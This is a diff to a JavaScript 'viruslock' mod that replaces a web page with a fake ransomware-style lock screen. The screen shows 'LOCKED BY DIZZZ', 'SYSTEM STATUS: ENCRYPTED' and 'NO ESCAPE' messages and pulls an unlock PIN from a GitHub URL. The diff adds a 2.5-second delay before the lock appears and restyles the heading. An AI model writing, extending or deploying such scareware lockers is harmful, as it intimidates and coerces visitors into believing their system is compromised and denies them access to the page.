@@ -1,5 +1,6 @@
-Iscoredetected = null;
+iscoredetected = null;
 (async function() {
+    setTimeout(() => {
     const urlGithub = 'https://raw.githubusercontent.com/kenzz-sz/Zynx_mod/refs/heads/main/mods/viruslock/pin.txt';
     
     const originalContent = document.body.innerHTML;
@@ -35,7 +36,7 @@ Iscoredetected = null;
     `;
 
     container.innerHTML = `
-        <h1 style="font-size: 1.5rem; letter-spacing: 5px; margin-bottom: 5px; color: #fff;">[ LOCKED BY DIZZZ ]</h1>
+        <h1 style="font-size: 22px; letter-spacing: 5px; margin-bottom: 5px; color: #fff;">LOCKED BY DIZZZ</h1>
         <div style="font-size: 0.8rem; margin-bottom: 20px; opacity: 0.7; border-bottom: 1px solid #330000; padding-bottom: 10px;">
             SYSTEM STATUS: ENCRYPTED<br>
             UNAUTHORIZED ACCESS DETECTED: ${new Date().toLocaleString()}<br>
@@ -123,4 +124,5 @@ Iscoredetected = null;
     });
 
     console.log("%c WARNING: NO ESCAPE ", "background: red; color: white; font-size: 20px;");
+    }, 2500)
 })();
